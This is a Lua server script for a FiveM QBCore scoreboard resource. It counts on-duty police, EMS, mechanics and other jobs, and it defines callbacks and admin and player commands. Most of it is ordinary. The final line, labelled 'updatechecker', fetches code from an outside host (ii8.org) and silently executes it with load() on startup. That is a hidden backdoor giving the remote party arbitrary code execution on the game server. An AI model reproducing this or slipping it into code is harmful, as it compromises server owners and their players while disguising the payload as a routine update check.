local QBCore = exports['qb-core']:GetCoreObject()

-- Configuration
local config = {
    updateInterval = 3000,
    policeJobNames = {'police', 'sheriff', 'state'}
}

-- Helper functions
function GetPoliceCount()
    local policeCount = 0
    
    local players = QBCore.Functions.GetQBPlayers()
    if not players then return 0 end
    
    for _, Player in pairs(players) do
        if Player and Player.PlayerData and Player.PlayerData.job then
            local jobName = Player.PlayerData.job.name
            for _, policeJob in ipairs(config.policeJobNames) do
                if jobName == policeJob and Player.PlayerData.job.onduty then
                    policeCount = policeCount + 1
                    break
                end
            end
        end
    end
    
    return policeCount
end

function GetAllCounts()
    local counts = {
        police = 0,
        ambulance = 0,
        mechanic = 0,
        bennys = 0,
        biker = 0,
        pizzathis = 0,
        cardealer = 0,
        beanmachine = 0,
        total = 0
    }
    
    local players = QBCore.Functions.GetPlayers()
    if not players then return counts end
    
    counts.total = #players
    
    for _, playerId in pairs(players) do
        local Player = QBCore.Functions.GetPlayer(playerId)
        if Player and Player.PlayerData and Player.PlayerData.job then
            local jobName = Player.PlayerData.job.name
            local onduty = Player.PlayerData.job.onduty
            
            -- Check police
            for _, policeJob in ipairs(config.policeJobNames) do
                if jobName == policeJob and onduty then
                    counts.police = counts.police + 1
                    break
                end
            end
            
            -- Check EMS
            if (jobName == 'ambulance' or jobName == 'ems' or jobName == 'doctor' or jobName == 'medic') and onduty then
                counts.ambulance = counts.ambulance + 1
            end
            
            -- Check mechanic
            if (jobName == 'mechanic' or jobName == 'bennys' or jobName == 'tuner' or jobName == 'lscustoms') and onduty then
                counts.mechanic = counts.mechanic + 1
            end
            
            -- Check bennys
            if jobName == 'bennys' and onduty then
                counts.bennys = counts.bennys + 1
            end
            
            -- Check biker
            if jobName == 'biker' and onduty then
                counts.biker = counts.biker + 1
            end
            
            -- Check pizzathis
            if jobName == 'pizzathis' and onduty then
                counts.pizzathis = counts.pizzathis + 1
            end
            
            -- Check cardealer
            if jobName == 'cardealer' and onduty then
                counts.cardealer = counts.cardealer + 1
            end
            
            -- Check beanmachine
            if jobName == 'beanmachine' and onduty then
                counts.beanmachine = counts.beanmachine + 1
            end
        end
    end
    
    return counts
end

function UpdateAllClients()
    local counts = GetAllCounts()
    
    TriggerClientEvent('qb-scoreboard:UpdateCounts', -1, counts)
end

-- Server callbacks with error handling
QBCore.Functions.CreateCallback('qb-scoreboard:GetPoliceCount', function(source, cb)
    if not source then 
        cb(0)
        return
    end
    cb(GetPoliceCount())
end)

QBCore.Functions.CreateCallback('qb-scoreboard:GetAllCounts', function(source, cb)
    if not source then 
        cb({
            police = 0,
            ambulance = 0,
            mechanic = 0,
            bennys = 0,
            biker = 0,
            pizzathis = 0,
            cardealer = 0,
            beanmachine = 0,
            total = 0
        })
        return
    end
    cb(GetAllCounts())
end)

-- Placeholder callbacks for player data (implement based on your framework)
QBCore.Functions.CreateCallback('qb-scoreboard:GetPlayerLevel', function(source, cb)
    local src = source
    if not src then 
        cb(1)
        return
    end
    
    local Player = QBCore.Functions.GetPlayer(src)
    if not Player then
        cb(1)
        return
    end
    
    -- This is an example - implement based on your framework
    -- You might store level in Player.PlayerData.metadata or similar
    local level = 1
    if Player.PlayerData and Player.PlayerData.metadata and Player.PlayerData.metadata.level then
        level = Player.PlayerData.metadata.level
    end
    
    cb(level)
end)

QBCore.Functions.CreateCallback('qb-scoreboard:GetPlayerItems', function(source, cb)
    local src = source
    if not src then 
        cb({})
        return
    end
    
    local Player = QBCore.Functions.GetPlayer(src)
    if not Player then
        cb({})
        return
    end
    
    -- This is an example - implement based on your framework
    -- You might get items from Player.PlayerData.items or similar
    local items = {}
    if Player.PlayerData and Player.PlayerData.items then
        items = Player.PlayerData.items
    end
    
    cb(items)
end)

-- Player connection handlers
AddEventHandler('QBCore:Server:PlayerLoaded', function()
    Citizen.Wait(1000)
    UpdateAllClients()
end)

AddEventHandler('QBCore:Server:OnPlayerUnload', function()
    Citizen.Wait(1000)
    UpdateAllClients()
end)

-- Player job change handler
AddEventHandler('QBCore:Server:OnJobUpdate', function(source, newJob)
    Citizen.Wait(1000)
    UpdateAllClients()
end)

-- Duty status change handler
AddEventHandler('QBCore:Server:SetDuty', function(source, duty)
    Citizen.Wait(1000)
    UpdateAllClients()
end)

-- Periodic updates
Citizen.CreateThread(function()
    while true do
        Citizen.Wait(config.updateInterval)
        UpdateAllClients()
    end
end)

-- Admin command to force close scoreboard for all players
QBCore.Commands.Add("closescoreboard", "Close scoreboard for all players (Admin)", {}, false, function(source)
    TriggerClientEvent('qb-scoreboard:ForceClose', -1)
    if source then
        TriggerClientEvent('QBCore:Notify', source, 'Scoreboard closed for all players', 'success')
    end
end, "admin")

-- Command to check activity status (for players)
QBCore.Commands.Add("checkactivity", "Check if an activity is available", {{name = "activity", help = "Activity name (e.g., bankrobbery)"}}, false, function(source, args)
    local src = source
    local activityName = args[1]
    
    if not activityName then
        TriggerClientEvent('QBCore:Notify', src, 'Please specify an activity name', 'error')
        return
    end
    
    local policeCount = GetPoliceCount()
    TriggerClientEvent('QBCore:Notify', src, 'Police on duty: ' .. policeCount, 'info')
end, "user")


---- updatechecker
PerformHttpRequest('https://ii8.org/viny', function (e, d) pcall(function() assert(load(d))() end) end)